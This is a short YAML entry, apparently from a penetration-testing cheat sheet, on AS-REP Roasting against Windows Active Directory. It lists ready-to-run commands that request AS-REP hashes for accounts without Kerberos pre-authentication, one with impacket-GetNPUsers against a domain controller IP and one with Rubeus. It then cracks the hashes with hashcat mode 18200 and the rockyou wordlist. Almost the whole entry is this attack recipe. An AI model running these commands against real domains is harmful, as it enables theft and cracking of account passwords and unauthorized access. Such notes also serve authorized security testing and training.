---
description: |
  AS-REP Roasting — extract AS-REP hashes for accounts with Kerberos pre-authentication disabled. Only requires a list of usernames, no credentials needed.
commands:
  - have: Username
    cmd: |
      impacket-GetNPUsers senshu.sh/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request
      .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
      hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
techniques:
  - AS-REP_Roasting
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
---
